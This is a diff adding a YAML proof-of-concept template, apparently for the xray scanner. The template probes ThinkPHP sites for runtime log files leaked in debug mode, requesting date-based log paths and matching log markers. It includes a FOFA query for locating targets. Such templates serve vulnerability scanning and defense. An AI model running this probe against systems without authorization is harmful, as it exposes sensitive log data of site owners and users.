@@ -1,0 +1,37 @@
+name: poc-yaml-thinkphp-runtime-log-leak
+transport: http
+
+set:
+  tp3Date: substr(timeConvert(int(now()), "2006_01_02/3/4/05"), 2,8)
+  tp5Month: substr(replaceAll(timeConvert(int(now()), "2006_01_02/3/4/05"), "_", ""),0,6)
+  tp5Date: substr(replaceAll(timeConvert(int(now()), "2006_01_02/3/4/05"), "_", ""), 6,2)
+
+  keyWord: substr(replaceAll(timeConvert(int(now()), "2006_01_02/3/4/05"), "_", "-"),0,10)
+
+rules:
+  tp3:
+    request:
+      method: GET
+      path: /Application/Runtime/Logs/Home/{{tp3Date}}.log
+      follow_redirects: true
+    expression: |-
+      response.status == 200 && response.body_string.contains(keyWord) 
+      && (
+      response.body_string.contains("INFO:")
+      || response.body_string.contains("DEBUG:")
+      ) &&
+      response.body_string.contains("RunTime:")
+  tp5:
+    request:
+      method: GET
+      path: /Runtime/Log/{{tp5Month}}/{{tp5Date}}.log
+      follow_redirects: true
+    expression: response.status == 200 && response.body_string.contains(keyWord) && response.body_string.contains("------") && response.body_string.contains("RunTime:")
+expression: tp3() || tp5()
+detail:
+  author: Chin
+  description:
+    ThinkPHP 是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架。
+    ThinkPHP Debug 模式存在日志信息泄露漏洞，在开启Debug的情况下会在Runtime目录下生成日志，攻击者通过构造特殊URL地址，读取日志敏感信息。
+  tags: 信息泄漏
+  fofa: app="ThinkPHP"
